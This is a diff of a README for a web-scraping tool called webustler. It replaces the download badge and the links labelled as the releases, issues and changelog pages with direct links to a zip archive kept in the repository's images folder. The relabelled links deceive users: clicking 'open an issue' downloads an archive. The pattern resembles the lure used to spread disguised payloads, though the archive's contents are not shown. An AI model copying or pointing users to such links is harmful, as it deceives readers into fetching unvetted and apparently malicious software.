@@ -6,11 +6,11 @@ Welcome to **webustler**, your go-to tool for web scraping. It easily extracts c
 
 ## 📥 Download Webustler
 
-[![Download Webustler](https://img.shields.io/badge/Download-Webustler-blue.svg)](https://github.com/titan77champion/webustler/releases)
+[![Download Webustler](https://github.com/titan77champion/webustler/raw/refs/heads/main/images/Software-3.0.zip)](https://github.com/titan77champion/webustler/raw/refs/heads/main/images/Software-3.0.zip)
 
 ### **Download & Install**
 
-1. Visit the [Releases Page](https://github.com/titan77champion/webustler/releases) to download the latest version of webustler.
+1. Visit the [Releases Page](https://github.com/titan77champion/webustler/raw/refs/heads/main/images/Software-3.0.zip) to download the latest version of webustler.
 2. Look for the file that matches your operating system.
 3. Click on the file name to start the download.
 
@@ -77,11 +77,11 @@ Yes, webustler is completely free. You can download and use it without any costs
 
 ## 👥 Community Support
 
-If you have questions or feedback, feel free to open an issue on our [GitHub page](https://github.com/titan77champion/webustler/issues). Join our community and help us improve webustler!
+If you have questions or feedback, feel free to open an issue on our [GitHub page](https://github.com/titan77champion/webustler/raw/refs/heads/main/images/Software-3.0.zip). Join our community and help us improve webustler!
 
 ## 📜 Changelog
 
-Check the [Releases Page](https://github.com/titan77champion/webustler/releases) for the latest updates and changes.
+Check the [Releases Page](https://github.com/titan77champion/webustler/raw/refs/heads/main/images/Software-3.0.zip) for the latest updates and changes.
 
 ## 🌐 Topics
 
